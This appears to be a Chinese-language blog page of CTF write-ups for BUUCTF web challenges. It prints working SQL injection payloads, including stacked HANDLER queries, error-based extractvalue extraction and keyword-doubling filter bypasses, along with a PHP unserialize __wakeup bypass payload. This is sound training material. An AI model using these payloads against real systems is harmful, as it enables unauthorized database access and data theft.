<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="buuctf, q1n9&#39;s blog">
    <meta name="description" content="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1å•å¼•å·å›´çš„SQLçš„è¯­æ³•æ ¼å¼è§„å®šâ€“å’Œåé¢çš„æ³¨é‡Šå†…å®¹å¿…é¡»é—´éš”ä¸€ä¸ªç©ºæ ¼åœ¨SQLæ³¨å…¥ä¸­ï¼Œâ€œâ€“+â€å¯ç”¨äºæ³¨é‡Šæ˜¯å› ä¸ºåœ¨SQLè¯­æ³•é‡Œï¼Œâ€œâ€“ â€ï¼ˆåé¢æœ‰ç©ºæ ¼ï¼‰æ˜¯æ ‡å‡†çš„å•è¡Œæ³¨é‡Šèµ·å§‹æ ‡è¯†ï¼Œâ€œ+â€åœ¨è¿™é‡Œå¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>buuctf | q1n9&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">q1n9&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="æ·±è‰²/æµ…è‰²æ¨¡å¼" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">q1n9&#39;s blog</div>
        <div class="logo-desc">
            
            welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">buuctf</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                            <a href="/tags/wp/">
                                <span class="chip bg-color">wp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2025-01-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2025-08-26
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    21.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    94 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>å•å¼•å·å›´çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQLçš„è¯­æ³•æ ¼å¼è§„å®šâ€“å’Œåé¢çš„æ³¨é‡Šå†…å®¹å¿…é¡»é—´éš”ä¸€ä¸ªç©ºæ ¼<br>åœ¨SQLæ³¨å…¥ä¸­ï¼Œâ€œâ€“+â€å¯ç”¨äºæ³¨é‡Šæ˜¯å› ä¸ºåœ¨SQLè¯­æ³•é‡Œï¼Œâ€œâ€“ â€ï¼ˆåé¢æœ‰ç©ºæ ¼ï¼‰æ˜¯æ ‡å‡†çš„å•è¡Œæ³¨é‡Šèµ·å§‹æ ‡è¯†ï¼Œâ€œ+â€åœ¨è¿™é‡Œå¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ã€‚å½“æ•°æ®åº“æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œé‡åˆ°â€œâ€“ â€å°±ä¼šå¿½ç•¥åé¢çš„å†…å®¹ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œé€šè¿‡æ„é€ åŒ…å«â€œâ€“+â€çš„æ¶æ„è¯­å¥ï¼Œä½¿åé¢çš„æŸ¥è¯¢é€»è¾‘è¢«æ³¨é‡Šæ‰ï¼Œä»è€Œè¾¾åˆ°æ”¹å˜æŸ¥è¯¢åŸæ„ã€è·å–éæ³•æ•°æ®ç­‰ç›®çš„ã€‚<br>æ‰€ä»¥ä¸€å®šè¦æœ‰ç©ºæ ¼å•Šï¼ˆ</p>
<hr>
<h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">1';
handler `1919810931114514` open;
handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>è¿™é“é¢˜æˆ‘å¥½åƒè¢«å‰§é€äº†ï¼ˆï¼Œæœ¬æ¥æƒ³æ‰“å¼€å°æœ¬æœ¬ç¿»ä¸€ç¿»å †å ï¼ˆå› ä¸ºæˆ‘è¶Šçœ‹è¶Šç†Ÿæ‚‰ï¼Œå¥½åƒè¦ç”¨è¿™ä¸ªï¼‰ï¼Œç»“æœå‘ç°å †å å°±æ˜¯ä»è¿™é“é¢˜æŠ„çš„ï¼ˆ<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p>
<pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;
handler `ddl` read next;--
ä¸€æ ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1</h3><p>å…ˆæ”¾ä¸ªå­—å…¸<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20ï¼Œ=éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†likeæ²¡è¢«è¿‡æ»¤æ¢=;andä¹Ÿè¢«æäº†ï¼Œç”¨orï¼ˆburpå¯è§ï¼Œåæ­£è¿‡æ»¤äº†ä¸€å †ï¼Œå°±ä¸æ”¾å›¾äº†<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limitæ²¡è¢«è¿‡æ»¤ï¼Œè¯´æ˜æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>æŸ¥ä¸€ä¸ªæ–°çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0ä¸å¯<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>ï¼ˆï¼‰å¯ï¼Œå°è¯•äº†ä¸‹å¯ä¸º<code>1'or(1)like(1)#</code>ï¼Œä¸‡èƒ½å¯†ç æˆåŠŸåå‘ç°åªæœ‰è¿™ä¸ªï¼Œç”¨æŠ¥é”™æ³¨å…¥<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>æˆ‘ç”¨æˆ‘çš„é‚£ä¸ªæŠ¥é”™æ³¨å…¥çš„æ–¹æ³•å‘ç°ä¸€ç›´ä¸å¯¹ï¼Œç„¶åå‘ç°æ˜¯randè¢«è¿‡æ»¤äº†ã€‚<del>å¥½å¥½å¥½ï¼Œä¸‰ç§æ–¹æ³•é€‰äº†ä¸€ç§å°±æ­£å¥½è¢«è¿‡æ»¤äº†</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>é‚£å°±æ¢ä¸ª<br>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://ï¼‰extractvalueæ— äº‹ï¼Œé‚ç”¨<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>è¿™é‡Œæˆ‘å‘ç°ç›´æ¥ç”¨hackbarä¼ ä¸å¯¹ï¼Œç„¶ååœ¨ç™»å½•ç•Œé¢é‡æ–°å°è¯•äº†ä¸€ä¸‹ï¼Œå¹¶è§‚å¯Ÿä¸Šæ–¹ç½‘å€ï¼Œå‘ç°éœ€è¦ç”¨URLç¼–ç åå†execute<br><del>ï¼ˆå¯èƒ½æ˜¯å› ä¸ºè¿‡æ»¤çš„å¤ªå¤šäº†å§ï¼Œå¤ªå±‘äº†</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>ç„¶åå‘ç°substrè¢«è¿‡æ»¤äº†ï¼ˆæ‚²<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>é‚å†æ‰¾ï¼ˆ<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>è¯•äº†ä¸€ä¸‹leftå’Œrightéƒ½æŒºå®‰å…¨çš„<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>æ‹¼ä¸€ä¸‹<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p>
<hr>
<p><del>è¯è¯´sqlmapèƒ½ä¸èƒ½å†å¤šå‡ºä¸€äº›è„šæœ¬ä»€ä¹ˆçš„ï¼Œä¸å¤Ÿç”¨å“‡</del><br><del>ç­‰æˆ‘å¤ä¹ å®Œcppä¸€å®šé«˜äº§ä¼¼é‚£å•¥å’•å’•å’•å’•</del></p>
<h3 id="ACTF2020-æ–°ç”Ÿèµ›-Upload1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload1"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload1</h3><p>éšæœºæŒ‘é€‰ä¸€ä¸ªå¹¸è¿å„¿ï¼ˆ<br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f10d02.png" alt="c52edc539d97fb471a45ef6083cf100e.png"><br><del>äº”æ¯’ä¿±å…¨</del><br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f0a7e7.png" alt="1636aeb681a2402a389c787dac4292c7.png"></p>
<hr>
<h3 id="GXYCTF2019-BabyUpload1"><a href="#GXYCTF2019-BabyUpload1" class="headerlink" title="[GXYCTF2019]BabyUpload1"></a>[GXYCTF2019]BabyUpload1</h3><p>æ€»ä¹‹è¯•äº†è¯•å¥½åƒæ™®é€špng,gif,.htaccesséƒ½ä¸å¯ï¼Œæ™®é€šçš„jpgå¯<br>ç„¶åç‚¹è¿›äº†é¢˜ç›®ä¸‹çš„é“¾æ¥ï¼ˆ<br><img src="https://pick.lwzheng.tech/2024/12/20/6765700acb68f.png" alt="759d44425892524fda812388b57711e6.png"><br><del>(è¾£ä¹ˆå¤§ä¸ªé“¾æ¥æ€»ä¹‹å°±æ˜¯ç›´æ¥ç‚¹è¿›å»äº†</del><br><a href="https://">http://9fd24382-f481-438e-a0be-28adc1a81bac.node5.buuoj.cn:81</a><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90ba5d7.png" alt="b624b5b858e10f870886fa4a0ea31a52.png"><br><del>é‚£å°±æŒ‰å®ƒçš„è¦æ±‚æ¥å§</del><br><img src="https://pick.lwzheng.tech/2024/12/20/676570f188114.png" alt="8d021b4aad2303f305dfffb268acc12e.png"><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90732aa.png" alt="5186e40e3c2c83506375d1ef8f67352c.png"><br>è¿˜æœ‰è¦æ³¨æ„è®¿é—®çš„è·¯å¾„æ˜¯ä»uploadåå¼€å§‹</p>
<hr>
<h4 id="suprise-egg"><a href="#suprise-egg" class="headerlink" title="suprise egg"></a>suprise egg</h4><p><del>æ€»ä¹‹æ˜¯è¢«è­¦å‘Šäº†</del><br><img src="https://pick.lwzheng.tech/2024/12/20/67656f2c6b0ae.png" alt="d05e7988e0592d25d4a302c53052a38c.png"><br><del>è¢«æ”»å‡»äº†ï¼Œbuuä½ æœ‰ä»€ä¹ˆå¤´ç»ªå—</del></p>
<hr>
<p>å¥½å¥½å¥½ç»ˆäºæŠŠç¬¬äºŒå‘¨çš„è¦æ±‚å†…å®¹è‚å®Œäº†ï¼Œè¿™å›çœŸçš„è¦å’•å’•å’•å’•å’•å’•å’•äº†<br><del>ç»å¯¹ä¸æ˜¯å› ä¸ºä»€ä¹ˆæœ€è¿‘æ²‰è¿·çœ‹cs2æ¯”èµ›</del><br>è¯è¯´è¿™ä¸ªHashcoinæœ‰ä»€ä¹ˆç”¨ä¹ˆï¼Œ<del>é›†é½100ä¸ªæ˜¯ä¸æ˜¯èƒ½å¬å”¤ç¥é¾™</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ccd0a6165944604cf2a0641cd6e4538.png"></p>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL1</h3><p>ç»•è¿‡ï¼Œ<del>ä¼¼æ›¾ç›¸è¯†çš„æ–¹æ³•</del><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,3--+</code><br><del>æˆ‘èµŒ1åŒ…è¾£æ¡informationç»å¯¹æ˜¯è¢«fromç‰µè¿çš„ï¼ï¼ï¼ï¼ˆéœ‡æ€’ï¼‰</del><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e1495ce3c.png" alt="e383ecc0ef4ca571f5e0f3cc5405760c.png"><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code><br>ç»å…¸äºŒé€‰ä¸€ï¼Œgeekuserå¤§å¤±è´¥ï¼ˆæ‚²ï¼‰<br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3920c467.png" alt="99665abe50f908d6b7b1eee17ca0eadb.png"><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3c0e718e.png" alt="f045cddb3e1a5ec3786df7f1aa9fc37f.png"><br><del>å”‰ï¼Œ2077ä¸–ç•Œ</del></p>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67864452c785f.png" alt="0bc4e1d145789dc6a1b306c25a22d48d.png"><br><a href="https://">https://www.runoob.com/php/php-unserialize-function.html</a><br><a href="https://">https://www.runoob.com/php/php-serialize-function.html</a><br><a href="https://">https://twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }

    function __wakeup(){
        $this-&gt;username = 'guest';
    }#ä¼šç»™usernameå†èµ‹å€¼

    function __destruct(){
        if ($this-&gt;password != 100) {
            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";
            echo "You name is: ";
            echo $this-&gt;username;echo "&lt;/br&gt;";
            echo "You password is: ";
            echo $this-&gt;password;echo "&lt;/br&gt;";
            die();
        }
        if ($this-&gt;username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";
            die();

            
        }
    }
}

?ã€‹
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-none"><code class="language-none">include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>?select=</p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
class Name
{
    private $username = 'admin';
    private $password = 100;
}
$a=new Name;
echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>O:4:â€Nameâ€:2:{s:14:â€ Name usernameâ€;s:5:â€adminâ€;s:14:â€ Name passwordâ€;i:100;}<br>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“å‰å±æ€§ä¸ªæ•°å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè·³è¿‡__wakeup()ï¼Œå»æ‰§è¡Œ__destruct<br>O:4:â€Nameâ€:3:{s:14:â€ Name usernameâ€;s:5:â€adminâ€;s:14:â€ Name passwordâ€;i:100;}<br>ä½†è¿˜æ˜¯è¯´no,hacker<del>(ç ´éŸ³ï¼‰</del><br><img src="https://pick.lwzheng.tech/2025/01/14/678649cf11905.png" alt="2bec80f91e6bfad2870d1f2232683db7.png"></p>
<blockquote>
